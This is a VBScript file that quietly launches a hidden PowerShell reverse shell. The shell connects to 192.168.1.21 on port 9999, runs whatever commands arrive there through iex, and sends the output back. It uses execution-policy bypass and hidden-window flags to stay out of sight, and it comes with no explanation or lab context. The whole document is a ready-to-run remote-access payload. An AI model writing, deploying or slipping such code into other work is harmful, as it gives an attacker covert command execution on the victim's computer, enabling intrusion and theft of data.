Set objShell = CreateObject("WScript.Shell")
command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
    "\"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',9999);" & _
    "$stream = $client.GetStream();" & _
    "[byte[]]$bytes = 0..65535|%%{0};" & _
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" & _
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" & _
    "$sendback = (iex $data 2>&1 | Out-String );" & _
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
    "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
    "$stream.Flush()};" & _
    "$client.Close()\""

objShell.Run command, 0, False